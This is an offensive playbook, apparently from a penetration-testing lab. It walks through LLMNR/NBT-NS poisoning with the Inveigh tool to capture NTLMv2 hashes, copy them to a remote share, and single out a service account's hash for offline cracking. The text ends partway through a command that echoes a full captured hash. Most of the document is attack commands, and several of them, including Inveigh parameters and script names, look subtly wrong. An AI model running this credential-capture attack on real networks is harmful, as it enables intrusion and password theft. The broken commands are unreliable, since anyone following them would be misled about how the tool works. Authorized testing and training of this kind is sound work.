# 🛰️ LLMNR/NBT-NS Poisoning with Inveigh

## 🔍 Overview
[!INFO] This playbook outlines a technique to perform LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) poisoning using the PowerShell tool `Inveigh` to capture NTLMv2 hashes from targeted machines on a network. These captured hashes can then be cracked offline for potential password recovery.

## 📄 Prerequisites
[!NOTE] Before executing this playbook, ensure you have:

- A Windows machine with administrative privileges.
- The Inveigh tool downloaded and placed in the `C:\Inveigh` directory.
- Hashcat installed on a Linux machine for cracking NTLMv2 hashes.
- Proper authorization to conduct network attacks in your environment.

## 🛠️ Setup
### 🔑 Installing Inveigh
[!SUCCESS] Follow these steps to install Inveigh:

1. Download the PowerShell ZIP file from https://github.com/Kevin-Robertson/Inveigh/releases.
2. Extract the files to `C:\Inveigh`.
3. Ensure you have administrative privileges on your Windows machine.

### 🌐 Starting Inveigh
[!SUCCESS] Start Inveigh with the following command:

```powershell
cd C:\Inveigh

# Launch HTTP server for config file and hash storage (optional)
.\Inveigh\Inveigh-HTTP.ps1 -Start -WebRoot .\http

# Start Inveigh poisoning LLMNR/NBT-NS and capturing NTLMv2 hashes
.\Inveigh\Inveigh.ps1 -Poison -Clients 50 -Verbose -Interface Ethernet
```

## 📝 Capturing Hashes
### 🔍 Viewing Live Capture
[!SUCCESS] To view live captures, use the following command:

```powershell
# List active clients and their hashes
.\Inveigh\Inveigh.ps1 -Show

# Monitor NTLMv2 hash captures in real-time
Get-EventLog -Newest 50 Security | Where-Object {$_.ReplacementStrings[4] -match "Inveigh"}
```

### 🔑 Storing Hashes for Transfer
[!SUCCESS] Store captured hashes to a file:

```powershell
# Save all captured NTLMv2 hashes in Inveigh session (1)
.\Inveigh\Inveigh.ps1 -HashStore 1

# Move the hash file to your designated share or manually copy it elsewhere
Move-Item .\hashes.csv \\<Machine_IP>\C$\hashdump.csv
```

## 🚀 Cracking Hashes
### 🔍 Identifying Targeted User Hash
[!SUCCESS] Identify and isolate a specific user's NTLMv2 hash for cracking:

```powershell
# Use PowerShell to filter the hash file for the targeted username (svc_qualys)
type .\Inveigh-NTLMv2.txt | Select-String -Pattern "svc_qualys"
```

### 🔧 Preparing Hash for Cracking
[!SUCCESS] Prepare the NTLMv2 hash for cracking:

```bash
# Save target user's hash to a file
echo "svc_qualys::INLANEFREIGHT:F9CAC827FD6ABFBF:4CF1F3B24BF1BF34D3ECC049D9FC7052:010100000000000086E60D7CDA82D801DFB87B40C430171C0000000002001A0049004E004C0041004E004500460052004500490047004800540001001E00410043004100440045004D0059002D00450041002D004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0003004600410043004100440045004D0059002D00450041002D004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080086E60D7CDA82D801060004000200000008003000300000000000000000000000003000006C04F59E654683B7ABEECE956F72B3A9164B0BD891DE9D612B30FF3E26D79F510A0010000000000000000000000000000000